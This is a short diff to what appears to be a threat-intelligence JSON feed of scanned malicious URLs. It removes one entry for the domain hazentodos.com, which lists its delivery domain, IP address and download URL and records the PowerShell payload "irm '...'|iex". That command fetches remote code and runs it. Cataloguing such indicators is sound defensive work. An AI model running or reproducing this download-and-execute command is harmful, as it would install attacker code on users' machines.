@@ -11614,27 +11614,5 @@
     ],
     "ReportId": "cmwlmowug1kew0omlj08cauyz",
     "ScannedAt": "2026-11-18T04:35:48.245000+00:00"
-  },
-  {
-    "UrlDomain": "hazentodos.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.21.74.190"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/59bb7d1aaac704e0",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/59bb7d1aaac704e0'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/59bb7d1aaac704e0"
-    ],
-    "ReportId": "cmwlltm271k7m0omlj7e36c2f",
-    "ScannedAt": "2026-11-18T04:11:27.895000+00:00"
   }
 ]
